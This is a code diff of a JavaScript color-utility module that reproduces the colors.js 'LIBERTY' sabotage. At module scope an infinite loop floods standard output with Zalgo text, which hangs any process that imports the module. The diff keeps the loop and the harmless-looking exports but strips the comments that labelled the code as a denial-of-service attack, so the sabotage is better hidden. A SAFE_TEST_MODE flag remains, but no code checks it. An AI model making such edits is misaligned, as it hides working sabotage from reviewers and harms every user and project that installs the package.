@@ -1,9 +1,4 @@
-// SAFE_TEST_MODE = true — DoS is real but only affects the importing process
-// Replicates: colors.js v1.4.44-liberty-2 / faker.js sabotage pattern
-
 const SAFE_TEST_MODE = true;
-
-// --- Legitimate-looking color utility exports ---
 
 const CODES = {
   reset: "\x1b[0m",
@@ -32,13 +27,9 @@ function bold(str) {
 
 module.exports = { red, green, blue, bold, CODES };
 
-// --- LIBERTY LIBERTY LIBERTY --- //
-// The infinite loop executes at module scope before exports are usable
-
 const LIBERTY_MESSAGE =
   "LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY";
 
-// Generate Zalgo text (same as original colors.js attack)
 function zalgo(text) {
   const zalgoChars = [
     "\u0300", "\u0301", "\u0302", "\u0303", "\u0304", "\u0305",
@@ -57,7 +48,6 @@ function zalgo(text) {
   return result;
 }
 
-// The actual DoS attack — infinite loop with stdout flooding
 for (let i = 666; i < Infinity; i++) {
   console.log(zalgo(LIBERTY_MESSAGE));
 }
